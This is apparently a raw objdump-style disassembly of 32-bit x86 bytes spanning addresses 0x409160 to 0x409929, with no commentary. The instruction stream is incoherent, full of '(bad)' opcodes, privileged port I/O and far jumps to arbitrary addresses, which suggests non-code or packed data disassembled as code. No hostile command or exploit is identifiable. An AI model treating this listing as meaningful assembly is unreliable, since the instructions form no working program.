  409160:	loope  0x4091e1
  409162:	fxtract 
  409164:	es ror al,cl
  409167:	dec    ebx
  409168:	xchg   BYTE PTR [esp+esi*2+0x45],cl
  40916c:	xchg   esp,eax
  40916d:	in     eax,dx
  40916e:	sub    edx,esi
  409170:	dec    esi
  409171:	js     0x4091e4
  409173:	push   ebx
  409174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409175:	jmp    0xbf94:0x4a38088
  40917c:	mov    esi,0x718b4e6b
  409181:	pop    ecx
  409182:	int    0x93
  409184:	push   ebp
  409185:	or     DWORD PTR [ecx-0x47],edi
  409188:	rcl    ah,0xd1
  40918b:	aad    0x37
  40918d:	loop   0x409180
  40918f:	bound  ebp,QWORD PTR [eax+ecx*2]
  409192:	mov    edi,0x85d8efc4
  409197:	and    edi,DWORD PTR [edi]
  409199:	shl    BYTE PTR [eax],cl
  40919b:	or     DWORD PTR [ebx+edi*8+0x1b],ecx
  40919f:	ds push esp
  4091a1:	or     eax,ebp
  4091a3:	adc    al,0x4a
  4091a5:	clc    
  4091a6:	lods   eax,DWORD PTR ds:[esi]
  4091a7:	xchg   esi,eax
  4091a8:	or     al,0x7f
  4091aa:	(bad)  
  4091ac:	test   al,0x35
  4091ae:	adc    BYTE PTR [ebp+0x17c847],bl
  4091b4:	in     eax,dx
  4091b5:	mov    ecx,0x2eac22b8
  4091ba:	les    sp,DWORD PTR [ebp-0x69]
  4091be:	arpl   WORD PTR [edi+eax*8+0x1119b17c],bx
  4091c5:	lock jge 0x409173
  4091c8:	adc    bh,BYTE PTR [edx-0x1c]
  4091cb:	lock retf 0xe271
  4091cf:	push   eax
  4091d0:	das    
  4091d1:	push   0xffffffd5
  4091d3:	in     eax,dx
  4091d4:	in     al,dx
  4091d5:	pop    ebp
  4091d6:	imul   WORD PTR [eax-0x19]
  4091da:	xchg   dl,al
  4091dc:	xchg   edx,eax
  4091dd:	scas   al,BYTE PTR es:[edi]
  4091de:	xchg   edx,eax
  4091df:	repnz adc dl,BYTE PTR [edx-0x6c0e6344]
  4091e6:	adc    ch,bl
  4091e8:	loopne 0x4091ea
  4091ea:	adc    ebp,ebx
  4091ec:	fidiv  DWORD PTR [ebp-0x74]
  4091ef:	loopne 0x4091c0
  4091f1:	adc    DWORD PTR [ecx+0x5fb5bac3],edi
  4091f7:	dec    esi
  4091f8:	ret    0x74c
  4091fb:	dec    edx
  4091fc:	sbb    al,0x73
  4091fe:	dec    edx
  4091ff:	cmc    
  409200:	xor    BYTE PTR [eax],dh
  409202:	fwait
  409203:	popa   
  409204:	daa    
  409205:	pop    edx
  409206:	aam    0x99
  409208:	sahf   
  409209:	sbb    al,0x43
  40920b:	pop    eax
  40920c:	xchg   esp,eax
  40920d:	mov    ebp,0x33692fa3
  409212:	int    0x56
  409214:	and    dl,BYTE PTR [ecx-0xd0fed64]
  40921a:	inc    edi
  40921b:	mov    bl,0x3e
  40921d:	pop    eax
  40921f:	xlat   BYTE PTR ds:[ebx]
  409220:	push   0x2d
  409222:	mov    eax,0xca690e54
  409227:	mov    eax,ds:0x21c0d52f
  40922c:	stc    
  40922d:	fwait
  40922e:	xor    BYTE PTR [edi],ah
  409230:	fidivr DWORD PTR [edx-0x39f70935]
  409236:	aam    0x86
  409238:	cdq    
  409239:	lahf   
  40923a:	jmp    0x3e5acddd
  40923f:	jne    0x4091e7
  409241:	out    0x40,al
  409243:	mov    ah,bh
  409245:	sub    DWORD PTR [ecx+0x10],0xffffff88
  409249:	call   0xc0f81e23
  40924e:	inc    ecx
  40924f:	(bad)  
  409250:	sahf   
  409251:	jae    0x409279
  409253:	xchg   edi,eax
  409254:	das    
  409255:	xchg   ebx,eax
  409256:	xor    DWORD PTR [edx+0x73],ebx
  409259:	mov    ebp,esi
  40925b:	cmp    DWORD PTR [esp+edx*4],0x34ff07c2
  409262:	adc    BYTE PTR [edi],dh
  409264:	sub    dl,BYTE PTR [ebx+esi*8-0x7d4c56a6]
  40926b:	push   eax
  40926c:	repnz out 0x22,al
  40926f:	lahf   
  409270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409271:	push   esi
  409272:	mov    ds:0x5844a14,eax
  409277:	stos   DWORD PTR es:[edi],eax
  409278:	cmp    DWORD PTR [esi],ecx
  40927a:	mov    al,ds:0x773cd5c6
  40927f:	jmp    0x409297
  409281:	adc    eax,0xc7b7b584
  409286:	shr    DWORD PTR [edx-0x176c9eb3],cl
  40928c:	inc    ecx
  40928d:	jnp    0x409216
  40928f:	jno    0x409292
  409291:	out    0x2d,al
  409293:	fadd   DWORD PTR [edi-0x2b]
  409296:	add    bl,bl
  409298:	sar    BYTE PTR [edi+0x7042a016],1
  40929e:	dec    esi
  40929f:	test   al,0xa9
  4092a1:	ret    0xfa9
  4092a4:	adc    esi,DWORD PTR [ebp+0x15f8367a]
  4092aa:	lock aam 0xe2
  4092ad:	push   ebp
  4092ae:	jp     0x409243
  4092b0:	pop    eax
  4092b1:	xchg   edx,eax
  4092b2:	test   DWORD PTR [edi-0x40],eax
  4092b5:	arpl   bp,bx
  4092b7:	or     DWORD PTR [edx+0x67],ecx
  4092ba:	inc    esi
  4092bb:	jns    0x4092bc
  4092bd:	xchg   ah,bh
  4092bf:	sbb    bh,BYTE PTR [ecx+0x58276cf7]
  4092c5:	add    ch,BYTE PTR [edi]
  4092c7:	jg     0x40927f
  4092c9:	xchg   ebp,eax
  4092ca:	and    ebp,0xffffff82
  4092cd:	xchg   esi,edx
  4092cf:	pop    edi
  4092d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092d1:	push   edi
  4092d2:	addr16 push 0x6
  4092d5:	scas   al,BYTE PTR es:[edi]
  4092d6:	push   edx
  4092d7:	sbb    DWORD PTR [ebp-0x3c15c212],0xd8c37ec5
  4092e1:	sahf   
  4092e2:	mov    ebp,0x447ee11b
  4092e7:	(bad)  
  4092e9:	cmp    eax,0x3654307f
  4092ee:	jmp    0x409303
  4092f0:	push   cs
  4092f1:	pop    es
  4092f2:	dec    esi
  4092f3:	adc    DWORD PTR [esi],ebx
  4092f5:	jae    0x40936c
  4092f7:	xor    al,0xff
  4092f9:	adc    DWORD PTR [esi+0xf],edx
  4092fc:	mov    edx,0xbccab07f
  409301:	mov    al,ds:0x72a71001
  409306:	xor    ecx,esi
  409308:	jp     0x40934a
  40930a:	mov    ss,WORD PTR [ebx+0x7c]
  40930d:	je     0x4092c3
  40930f:	adc    DWORD PTR [ecx+0x3df0f140],esi
  409315:	call   0xeb4eb018
  40931a:	sahf   
  40931b:	jle    0x409331
  40931d:	popf   
  40931e:	sub    al,0x79
  409320:	loop   0x409395
  409322:	inc    ecx
  409323:	scas   al,BYTE PTR es:[edi]
  409324:	add    BYTE PTR [edi],dl
  409326:	push   ebp
  409327:	xor    eax,0xe463d0ca
  40932c:	cwde   
  40932d:	adc    esi,DWORD PTR [esi-0x7f]
  409330:	cwde   
  409331:	les    esp,FWORD PTR [edi-0x40]
  409334:	push   ss
  409335:	sub    BYTE PTR [esi-0x765ef669],dl
  40933b:	int    0xa9
  40933d:	and    eax,0x5ce3d89d
  409342:	pushf  
  409343:	or     eax,0xcef3df2e
  409348:	inc    edi
  409349:	sbb    eax,0xbe3e1795
  40934e:	mov    ds:0x41dab6fe,al
  409353:	out    0xe7,al
  409355:	sub    al,0xad
  409357:	mov    ah,0x35
  409359:	and    eax,0x58b3287f
  40935e:	into   
  40935f:	ins    BYTE PTR es:[edi],dx
  409360:	mov    ecx,0x2d54bb40
  409365:	lods   al,BYTE PTR ds:[esi]
  409366:	and    BYTE PTR [esi],ah
  409368:	gs push es
  40936a:	push   ecx
  40936b:	xor    ebx,esi
  40936d:	js     0x409312
  40936f:	test   DWORD PTR [edi],esp
  409371:	jg     0x409328
  409373:	int    0x80
  409375:	adc    al,0xae
  409377:	(bad)  
  409378:	je     0x40930e
  40937a:	dec    ebx
  40937b:	or     esp,DWORD PTR ds:0xa77a8e84
  409381:	aad    0x3e
  409383:	inc    ebp
  409384:	dec    edi
  409385:	stos   BYTE PTR es:[edi],al
  409386:	mov    edi,0xddf1e006
  40938b:	adc    eax,0x39da91bd
  409390:	popa   
  409391:	jle    0x4093b8
  409393:	leave  
  409394:	ja     0x40934d
  409396:	jo     0x4093ff
  409398:	test   ah,ch
  40939a:	lods   eax,DWORD PTR ds:[esi]
  40939b:	rol    DWORD PTR [edi+0x7fe24aa5],1
  4093a1:	or     dh,cl
  4093a3:	add    esi,ebx
  4093a5:	or     BYTE PTR [edi],cl
  4093a7:	lock push eax
  4093a9:	cs sbb dh,dl
  4093ac:	ss icebp 
  4093ae:	xor    ecx,ebx
  4093b0:	pop    edi
  4093b1:	adc    ebx,ebx
  4093b3:	or     BYTE PTR [ebx-0x57c26630],dl
  4093b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ba:	add    DWORD PTR [ebp+0x56],ecx
  4093bd:	aaa    
  4093be:	fwait
  4093bf:	xchg   esp,eax
  4093c0:	or     eax,0xa38e468f
  4093c5:	popf   
  4093c6:	pop    ecx
  4093c7:	jle    0x409429
  4093c9:	mov    BYTE PTR [eax],al
  4093cb:	retf   0x8d7d
  4093ce:	dec    ebx
  4093cf:	or     eax,DWORD PTR [eax-0x1dbaa24]
  4093d5:	inc    esp
  4093d6:	inc    DWORD PTR [edi-0x3a2747f8]
  4093dc:	sub    ch,bh
  4093de:	inc    eax
  4093df:	sub    DWORD PTR [edi],edi
  4093e1:	cmp    edi,DWORD PTR [edi+0x4fb9c70c]
  4093e7:	xchg   BYTE PTR [ebx+eiz*4-0x1f],bh
  4093eb:	cdq    
  4093ec:	inc    ebp
  4093ed:	ds jle 0x409418
  4093f0:	xchg   ebx,eax
  4093f1:	mov    edi,0xa23999ab
  4093f6:	cwde   
  4093f7:	xchg   ebp,eax
  4093f8:	pop    ds
  4093f9:	adc    DWORD PTR [edi],0x3d
  4093fc:	and    al,0x27
  4093fe:	popf   
  4093ff:	xlat   BYTE PTR ds:[ebx]
  409400:	xchg   ebp,eax
  409401:	sar    edx,cl
  409403:	addr16 enter 0xaaa1,0x3d
  409408:	fiadd  WORD PTR [edx-0x7e]
  40940b:	push   es
  40940c:	push   eax
  40940d:	aaa    
  40940e:	xlat   BYTE PTR ds:[ebx]
  40940f:	pop    ss
  409410:	dec    edi
  409411:	cmp    ebp,ebp
  409413:	and    dh,BYTE PTR [ecx+edi*4-0x4a]
  409417:	xchg   ecx,eax
  409418:	cmp    ch,ah
  40941a:	mov    eax,ds:0xfb71b1f2
  40941f:	(bad)  [ecx+0x4a57976c]
  409425:	inc    eax
  409426:	cdq    
  409427:	sub    BYTE PTR [ecx-0x1c],0x3d
  40942b:	fcomi  st,st(1)
  40942d:	cmp    ch,dl
  40942f:	mov    DWORD PTR [ecx+eiz*1-0x5b],esp
  409433:	mov    al,0x1a
  409435:	xchg   edx,eax
  409436:	and    ebp,0x5da5fadf
  40943c:	jbe    0x4094a4
  40943e:	mov    ch,0x9
  409440:	lahf   
  409441:	and    eax,0x5e3de667
  409446:	into   
  409447:	sbb    al,0xa7
  409449:	sti    
  40944a:	repz mov ah,0xb7
  40944d:	pop    esp
  40944e:	bnd jo 0x40946e
  409451:	adc    eax,0x1cbf03b4
  409456:	fimul  WORD PTR [ebx-0x20]
  409459:	pusha  
  40945a:	jbe    0x4093f6
  40945c:	fldenv [esi+0x758b423]
  409462:	push   cs
  409463:	xlat   BYTE PTR ds:[ebx]
  409464:	(bad)  
  409465:	cs inc eax
  409467:	pop    eax
  409468:	aas    
  409469:	and    BYTE PTR [eax-0x6eaff09e],dl
  40946f:	mov    ebp,0xe4aa95d4
  409474:	inc    ebp
  409475:	mov    eax,0xda97bd35
  40947a:	mov    ecx,0x15f59f0d
  40947f:	mov    ds:0x96288e3b,al
  409484:	sub    eax,0x589bf0b9
  409489:	shl    DWORD PTR [esi],1
  40948b:	and    eax,DWORD PTR [edx]
  40948d:	mov    bl,0x66
  40948f:	dec    ebp
  409490:	push   ecx
  409491:	pop    esi
  409492:	mov    ah,0xac
  409494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409495:	dec    edx
  409496:	rcr    DWORD PTR [edi],1
  409498:	outs   dx,BYTE PTR ds:[esi]
  409499:	std    
  40949a:	fsub   st(1),st
  40949c:	jae    0x4094fa
  40949e:	repnz mov ebp,0xef71240f
  4094a4:	std    
  4094a5:	pop    ds
  4094a6:	enter  0x8607,0xd2
  4094aa:	mul    BYTE PTR ss:[esi+0x545a78a]
  4094b1:	sub    DWORD PTR [eax-0x439df032],edi
  4094b7:	jmp    0x978c:0x62a12751
  4094be:	sub    ebx,DWORD PTR ds:0x99e849b6
  4094c4:	in     al,0x8b
  4094c6:	js     0x409532
  4094c8:	clc    
  4094c9:	clc    
  4094ca:	adc    BYTE PTR [edx-0x6c],cl
  4094cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094ce:	add    al,0x3c
  4094d0:	and    dl,BYTE PTR [eax]
  4094d2:	jp     0x409511
  4094d4:	inc    ebx
  4094d5:	cvttps2pi mm1,xmm0
  4094d8:	stc    
  4094d9:	sti    
  4094da:	jb     0x409520
  4094dc:	cmp    BYTE PTR [esi],cl
  4094de:	clts   
  4094e0:	xchg   ebx,eax
  4094e1:	scas   eax,DWORD PTR es:[edi]
  4094e2:	retf   
  4094e3:	mov    bl,0x38
  4094e5:	mov    esi,DWORD PTR [ecx]
  4094e7:	loope  0x40946e
  4094e9:	dec    edi
  4094ea:	cmova  edi,DWORD PTR [edi+0x48a11bc2]
  4094f1:	dec    ebp
  4094f2:	sub    BYTE PTR [eax],ch
  4094f4:	mov    dl,0x52
  4094f6:	leave  
  4094f7:	add    DWORD PTR [ecx+ebp*8+0x3f8e7b1e],ebp
  4094fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094ff:	jl     0x40957a
  409501:	fwait
  409502:	pop    edi
  409503:	fcomp  st(4)
  409505:	sbb    al,0xe9
  409507:	call   0x4c5f3ca6
  40950c:	lock and cl,BYTE PTR [esi]
  40950f:	pop    eax
  409510:	xchg   ecx,eax
  409511:	icebp  
  409512:	fld    DWORD PTR [edx-0x7e]
  409515:	and    eax,eax
  409517:	ins    BYTE PTR es:[edi],dx
  409518:	lahf   
  409519:	or     edx,edx
  40951b:	push   ds
  40951c:	push   ebp
  40951d:	or     DWORD PTR [ecx+ecx*8+0x40],eax
  409521:	stos   BYTE PTR es:[edi],al
  409522:	out    0x1,al
  409524:	and    esp,eax
  409526:	test   DWORD PTR [ecx-0x56],esi
  409529:	addr16 jge 0x4094ba
  40952c:	les    ebx,FWORD PTR ds:0x3dc5d804
  409532:	add    edi,ebx
  409534:	cmp    dh,BYTE PTR [bp+di-0x14]
  409538:	add    ebp,DWORD PTR [edi-0x79]
  40953b:	stos   DWORD PTR es:[edi],eax
  40953c:	inc    eax
  40953d:	cwde   
  40953e:	inc    edx
  40953f:	jbe    0x409566
  409541:	scas   al,BYTE PTR es:[edi]
  409542:	pop    ecx
  409543:	pop    edx
  409544:	lea    esi,[edx-0x66174e21]
  40954a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40954b:	add    ah,BYTE PTR [ecx-0xd]
  40954e:	addr16 leave 
  409550:	cld    
  409551:	daa    
  409552:	xchg   ebp,eax
  409553:	mov    al,0x68
  409555:	and    ah,BYTE PTR [ebx]
  409557:	push   0x2
  409559:	adc    bh,al
  40955b:	ss push 0x78bea3c6
  409561:	sub    cl,BYTE PTR [edi+0x16]
  409564:	mov    al,0xb3
  409566:	repz mov cl,0xce
  409569:	lds    ecx,FWORD PTR [ecx+0x2486a12d]
  40956f:	sub    BYTE PTR [ebx],bh
  409571:	push   0xad976dc0
  409576:	imul   ebp,DWORD PTR [esi+eax*1],0xffffff9c
  40957a:	in     eax,0xef
  40957c:	jl     0x4095cb
  40957e:	jl     0x4095d8
  409580:	icebp  
  409581:	dec    ebp
  409582:	arpl   WORD PTR [esi],di
  409584:	push   ebp
  409585:	(bad)  
  409586:	inc    ebx
  409587:	(bad)  
  409588:	out    dx,al
  409589:	mov    cs,WORD PTR ds:0xa2e58f1d
  40958f:	xchg   esp,eax
  409590:	mov    eax,DWORD PTR [ecx+ecx*2]
  409593:	pop    edi
  409594:	lock fadd QWORD PTR [ecx-0x14d593df]
  40959b:	data16 repnz int3 
  40959e:	addr16 int3 
  4095a0:	vpand  ymm6,ymm3,YMMWORD PTR [edi+0x32910a55]
  4095a8:	mov    eax,esi
  4095aa:	mov    ebx,0x7cc38cc6
  4095af:	jmp    0x4095df
  4095b1:	jnp    0x40955e
  4095b3:	out    0xf6,al
  4095b5:	mov    DWORD PTR [eax+0x19],ebx
  4095b8:	(bad)  
  4095b9:	aam    0xf5
  4095bb:	mov    cl,0xe1
  4095bd:	sbb    al,0x8b
  4095bf:	mov    cl,0x58
  4095c1:	adc    al,ah
  4095c3:	mov    esp,0x86a72ac3
  4095c8:	mov    BYTE PTR [ebx+edx*1],dh
  4095cb:	outs   dx,BYTE PTR ds:[esi]
  4095cc:	js     0x409644
  4095ce:	(bad)  
  4095cf:	adc    al,BYTE PTR [edi+edi*1-0x39474d68]
  4095d6:	clc    
  4095d7:	nop
  4095d8:	aam    0x7e
  4095da:	and    DWORD PTR [esi-0x2b],edi
  4095dd:	sub    eax,0xd9a85a16
  4095e2:	and    bh,0xc7
  4095e5:	gs add eax,0x48942208
  4095eb:	add    eax,0x6dc26625
  4095f0:	push   ebx
  4095f1:	pusha  
  4095f2:	push   0x97190885
  4095f7:	iret   
  4095f8:	popf   
  4095f9:	mov    edi,0xe25f2558
  4095fe:	test   BYTE PTR [ebx+0x14201365],bl
  409604:	shl    DWORD PTR [eax-0x4b9837f4],1
  40960a:	inc    esp
  40960b:	sbb    eax,DWORD PTR [ecx+0x6ca67c55]
  409611:	loopne 0x4095e7
  409613:	(bad)  
  409614:	cld    
  409615:	jp     0x4095e3
  409617:	dec    esi
  409618:	jg     0x40967c
  40961a:	jecxz  0x4095a3
  40961c:	or     eax,0x9cf5e1b
  409621:	outs   dx,BYTE PTR ds:[esi]
  409622:	add    BYTE PTR [esi],bl
  409624:	out    dx,eax
  409625:	mov    cs,WORD PTR [edi-0x37]
  409628:	jnp    0x4095cb
  40962a:	sbb    ch,dh
  40962c:	jmp    0x790c4db
  409631:	arpl   dx,sp
  409633:	popa   
  409634:	mov    eax,ds:0xc417c8e6
  409639:	rcl    bh,cl
  40963b:	outs   dx,DWORD PTR ds:[esi]
  40963c:	inc    ecx
  40963d:	cwde   
  40963e:	retf   
  40963f:	ret    0x8abe
  409642:	mov    dl,BYTE PTR [edi]
  409644:	dec    ecx
  409645:	icebp  
  409646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409647:	loop   0x4096b2
  409649:	test   al,0xa6
  40964b:	ins    DWORD PTR es:[edi],dx
  40964c:	mov    ah,0xa7
  40964e:	retf   0x38a7
  409651:	inc    DWORD PTR [edx-0x632e442c]
  409657:	out    0xc2,al
  409659:	jb     0x409660
  40965b:	add    dl,0xf6
  40965e:	xor    BYTE PTR [edi+0x49],ch
  409661:	clc    
  409662:	call   FWORD PTR [ebx+0x425d0822]
  409668:	inc    ebp
  409669:	or     eax,0xbfff40e1
  40966e:	jmp    0x9f30:0x7f09587b
  409675:	sbb    al,0x69
  409677:	clc    
  409678:	and    ah,BYTE PTR [edi-0x60]
  40967b:	clc    
  40967c:	fpatan 
  40967e:	sub    eax,0xa44483eb
  409683:	dec    esp
  409684:	call   0xb35b0c96
  409689:	(bad)  
  40968a:	enter  0x7902,0xe8
  40968e:	jbe    0x4096a7
  409690:	pop    edx
  409691:	test   edi,0xb455fec2
  409697:	loop   0x4096d7
  409699:	dec    edi
  40969b:	pushf  
  40969c:	push   0x19
  40969e:	mov    bh,0x3a
  4096a0:	fdivr  DWORD PTR [ebx-0x25]
  4096a3:	out    dx,eax
  4096a4:	outs   dx,DWORD PTR ds:[esi]
  4096a5:	icebp  
  4096a6:	cmc    
  4096a7:	fidiv  DWORD PTR [ebp+0x70ee0808]
  4096ad:	(bad)  
  4096ae:	cli    
  4096af:	mov    ah,0x4d
  4096b1:	clc    
  4096b2:	jmp    0x883a:0x5d913104
  4096b9:	xchg   edx,eax
  4096ba:	push   esi
  4096bb:	inc    edx
  4096bc:	fscale 
  4096be:	inc    esi
  4096bf:	je     0x40970d
  4096c1:	imul   edi,DWORD PTR [edx],0x7f
  4096c4:	mov    cl,0xae
  4096c6:	and    BYTE PTR [ebp-0x2f],cl
  4096c9:	(bad)  
  4096ca:	jmp    0x85da4da3
  4096cf:	loop   0x4096c2
  4096d1:	enter  0x6d20,0x76
  4096d5:	js     0x409663
  4096d7:	mov    dl,0x13
  4096d9:	pop    edx
  4096da:	push   eax
  4096db:	loope  0x4096bc
  4096dd:	jbe    0x40968c
  4096df:	fwait
  4096e0:	mov    esi,0xd7ec0282
  4096e5:	sahf   
  4096e6:	das    
  4096e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096e8:	cmc    
  4096e9:	addr16 jg 0x40971e
  4096ec:	jae    0x409713
  4096ee:	shl    BYTE PTR [ecx-0x75],1
  4096f1:	mov    dl,0x41
  4096f3:	push   eax
  4096f4:	mov    ds,WORD PTR [edi-0x21]
  4096f7:	pop    ebx
  4096f8:	dec    ebp
  4096f9:	fidivr WORD PTR [ebp-0x541ec23e]
  4096ff:	adc    BYTE PTR [eax],bl
  409701:	and    bh,dl
  409703:	(bad)  [ecx-0x69]
  409706:	mov    dh,0x38
  409708:	ins    DWORD PTR es:[edi],dx
  409709:	cmp    BYTE PTR [edi-0xb2b36b3],bl
  40970f:	push   cs
  409710:	push   edx
  409711:	mov    dl,dl
  409713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409714:	push   ebx
  409715:	mov    eax,ds:0x41b370f0
  40971a:	icebp  
  40971b:	xor    DWORD PTR [eax+0x2ad4c710],0xffffffbd
  409722:	(bad)  
  409723:	mul    BYTE PTR [esi+0x32]
  409726:	inc    ebp
  409727:	xchg   ecx,eax
  409728:	lods   al,BYTE PTR ds:[esi]
  409729:	fnstenv [ebx-0x10ca3db8]
  40972f:	in     eax,0x14
  409731:	retf   
  409732:	imul   ebp,ecx,0xdce7978e
  409738:	sbb    BYTE PTR ds:0xb66d7b85,dh
  40973e:	lea    edi,[ebp-0x4b6bf9e0]
  409744:	sub    ebp,DWORD PTR [edx]
  409746:	sub    cl,BYTE PTR [edi]
  409748:	fisubr WORD PTR [ecx+ebp*1]
  40974b:	es inc esp
  40974d:	and    cl,cl
  40974f:	jle    0x4096ec
  409751:	mov    edx,0x662862fd
  409756:	mov    ch,0xab
  409758:	jp     0x4096ef
  40975a:	push   cs
  40975b:	xor    edi,DWORD PTR [ecx+0x2562cb5b]
  409761:	cmc    
  409762:	imul   ecx,DWORD PTR [eax],0x1d
  409765:	leave  
  409766:	or     ebp,esi
  409768:	inc    ecx
  409769:	cmp    BYTE PTR [edi],ch
  40976b:	add    ebp,DWORD PTR [ebp-0x37836428]
  409771:	call   0x50b7:0xf97d965c
  409778:	in     eax,dx
  409779:	lds    ebx,FWORD PTR [eax+0x20]
  40977c:	test   DWORD PTR [ebp+0x1f],esp
  40977f:	inc    edi
  409780:	pop    ds
  409781:	xchg   ebp,eax
  409782:	cld    
  409783:	jae    0x4097f9
  409785:	cmp    al,0xb9
  409787:	sub    ch,BYTE PTR [ebx]
  409789:	in     eax,dx
  40978a:	ss jbe 0x4097df
  40978d:	lds    edi,FWORD PTR [ecx]
  40978f:	pop    es
  409790:	mov    al,ah
  409792:	xor    BYTE PTR [ebx+0xbf2d2c5],al
  409798:	mov    ch,0xb5
  40979a:	adc    eax,0xc4cc91fc
  40979f:	inc    esp
  4097a0:	pop    es
  4097a1:	sbb    cl,ah
  4097a3:	sbb    al,al
  4097a5:	xor    eax,0x7c64ac0c
  4097aa:	pop    eax
  4097ab:	in     eax,dx
  4097ac:	jb     0x409808
  4097ae:	fwait
  4097af:	stc    
  4097b0:	jns    0x409745
  4097b2:	pusha  
  4097b3:	mov    esi,0x5e2fe7ae
  4097b8:	(bad)  
  4097b9:	cmp    eax,0x50cc9f05
  4097be:	retfw  0x8032
  4097c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c3:	out    0x23,al
  4097c5:	retf   
  4097c6:	bound  ebp,QWORD PTR [edx+0x43]
  4097c9:	mov    WORD PTR [ecx-0x54],cs
  4097cc:	cld    
  4097cd:	sub    ch,cl
  4097cf:	rcl    DWORD PTR [ebx-0xf],0xd8
  4097d3:	mov    ebx,ebp
  4097d5:	jge    0x40982e
  4097d7:	or     bh,al
  4097d9:	mov    edi,0x7406672d
  4097de:	jge    0x40982f
  4097e0:	xor    DWORD PTR [esi+edi*2],edx
  4097e3:	shl    BYTE PTR [ebp-0x6f4c65e1],cl
  4097e9:	das    
  4097ea:	ds je  0x4097c4
  4097ed:	mov    dh,0x5b
  4097ef:	push   es
  4097f0:	loopne 0x4097c9
  4097f2:	inc    esp
  4097f3:	push   0xfffffffb
  4097f5:	sbb    ebp,ecx
  4097f7:	aas    
  4097f8:	and    al,0x92
  4097fa:	dec    ebx
  4097fb:	xor    dl,BYTE PTR [edx+0x37]
  4097fe:	cmc    
  4097ff:	retf   
  409800:	cmc    
  409801:	cmp    DWORD PTR [ecx-0x8e40aac],0x162bc8a
  40980b:	nop
  40980c:	stos   DWORD PTR es:[edi],eax
  40980d:	jns    0x409838
  40980f:	into   
  409810:	mov    edx,0x7795259e
  409815:	ret    
  409816:	sub    al,al
  409818:	not    BYTE PTR [eax-0x3dba0ada]
  40981e:	and    BYTE PTR [esi-0x27],ah
  409821:	sub    dh,ah
  409823:	push   eax
  409824:	dec    esp
  409825:	xchg   ebx,eax
  409826:	sub    DWORD PTR [edi-0x4be55c46],edi
  40982c:	push   eax
  40982d:	test   eax,0x2129af81
  409832:	and    BYTE PTR [ebp-0x175f57b0],dl
  409838:	lds    ebp,FWORD PTR [ecx]
  40983a:	xchg   ecx,eax
  40983b:	add    al,0x9f
  40983d:	pushf  
  40983e:	mov    al,BYTE PTR [ebx-0x22]
  409841:	xchg   esi,eax
  409842:	mov    dh,0xeb
  409844:	out    0xf1,eax
  409846:	mov    ah,0x82
  409848:	(bad)  
  40984a:	and    eax,0xfbdbeb21
  40984f:	xchg   edi,eax
  409850:	(bad)  
  409851:	xchg   ebp,eax
  409852:	fsub   st,st(7)
  409854:	mov    ah,0x75
  409856:	xor    esi,edx
  409858:	mov    ebp,0x375691df
  40985d:	in     eax,0x38
  40985f:	or     al,0xc5
  409861:	nop
  409862:	pop    ss
  409863:	inc    ecx
  409864:	dec    edi
  409865:	mov    ebp,DWORD PTR [edx-0x24]
  409868:	push   0xd
  40986a:	lds    ebp,FWORD PTR [ebx+0x54]
  40986d:	mov    ebp,0xd52b060
  409872:	push   0xc72afe0b
  409877:	and    ecx,eax
  409879:	aas    
  40987a:	dec    edx
  40987b:	int    0x26
  40987d:	mov    DWORD PTR [edx-0x679f310f],ecx
  409883:	dec    eax
  409884:	cwde   
  409885:	add    BYTE PTR [edi],dh
  409887:	pop    ecx
  409888:	hlt    
  409889:	inc    ecx
  40988a:	outs   dx,DWORD PTR ds:[esi]
  40988b:	cmp    dh,ah
  40988d:	jg     0x409830
  40988f:	xor    DWORD PTR [eax],ecx
  409891:	jmp    0x37079260
  409896:	adc    cl,bh
  409898:	cmp    al,BYTE PTR [edx]
  40989a:	inc    esp
  40989b:	daa    
  40989c:	outs   dx,DWORD PTR ds:[esi]
  40989d:	fistp  DWORD PTR [esi-0xf]
  4098a0:	mov    ds:0x1ee87317,eax
  4098a5:	test   edx,edi
  4098a7:	add    BYTE PTR [edx],bl
  4098a9:	aas    
  4098aa:	retf   
  4098ab:	repnz pop edx
  4098ad:	push   esp
  4098ae:	outs   dx,BYTE PTR ds:[esi]
  4098af:	pop    ecx
  4098b0:	popa   
  4098b1:	xor    DWORD PTR [ebx-0x7a],edi
  4098b4:	leave  
  4098b5:	test   bl,ch
  4098b7:	icebp  
  4098b8:	mov    ss,WORD PTR [edx-0x1a9d42bf]
  4098be:	popf   
  4098bf:	mov    ah,0xab
  4098c1:	mov    dh,BYTE PTR [ecx]
  4098c3:	pop    esi
  4098c4:	cld    
  4098c5:	mov    edx,?
  4098c7:	xchg   ebp,eax
  4098c8:	lods   al,BYTE PTR ds:[esi]
  4098c9:	arpl   di,dx
  4098cb:	sbb    eax,0xf7288c9b
  4098d0:	outs   dx,DWORD PTR ds:[esi]
  4098d1:	push   edi
  4098d2:	mov    ebp,0x1c7480ba
  4098d7:	retf   
  4098d8:	jns    0x409882
  4098da:	dec    edi
  4098db:	and    al,0xb2
  4098dd:	stc    
  4098de:	sbb    al,0x68
  4098e0:	jmp    0xa10e933d
  4098e5:	lahf   
  4098e6:	stc    
  4098e7:	pop    ebp
  4098e8:	out    0xa7,al
  4098ea:	sbb    DWORD PTR [eax+0x6d2ce5c1],eax
  4098f0:	ja     0x409878
  4098f2:	mov    ah,0x5c
  4098f4:	sbb    eax,0x2b17484c
  4098f9:	repz pop ebx
  4098fb:	mov    edi,0xb28ed966
  409900:	jge    0x40992f
  409902:	pusha  
  409903:	cli    
  409904:	mov    ebx,0x9b4bcc32
  409909:	test   al,0x58
  40990b:	mov    ebp,0x75d7d247
  409910:	sbb    bh,ah
  409912:	icebp  
  409913:	sar    DWORD PTR [ebx+0x4781c887],1
  409919:	cwde   
  40991a:	add    eax,0x36242914
  40991f:	mov    ebp,0xbb7fd3d8
  409924:	push   cs
  409925:	test   al,0x8c
  409927:	test   al,0x21
  409929:	shr    BYTE PTR [ebp-0x40585e30],1
